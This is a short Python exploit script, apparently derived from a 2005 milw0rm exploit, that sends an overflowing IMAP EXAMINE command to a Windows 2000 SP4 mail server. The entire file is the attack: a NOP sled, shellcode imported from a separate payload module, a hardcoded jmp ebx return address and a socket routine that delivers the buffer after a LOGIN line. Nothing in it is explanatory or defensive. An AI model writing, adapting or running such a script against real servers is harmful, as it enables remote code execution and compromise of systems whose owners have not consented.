#!/usr/bin/python
############################################################

import sys
import struct
import socket
from time import sleep

from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Return Address - Win2k SP4 jmp ebx
        returnaddress = b"\x66\x4a\x4e\x7c"

        # Using Msf::Encoder::PexFnstenvMov with final size of 42 bytes
        # First Stage Shellcode

        
       

       

        buffer = b'\x90'*568 + buf + b'\x90'*53 + returnaddress + b'\xEB\x04' + b'\x90'*4 

       
        try:
                s.connect((target_machine,target_port))
        except:
             
                s.close()

        data=s.recv(1024)
        
        s.send(b'a001 LOGIN '+b'\r\n')
        data = s.recv(1024)
       
        s.send(b'A001 EXAMINE ' + buffer+b'\r\n')
        s.close()
       

        # milw0rm.com [2005-12-19]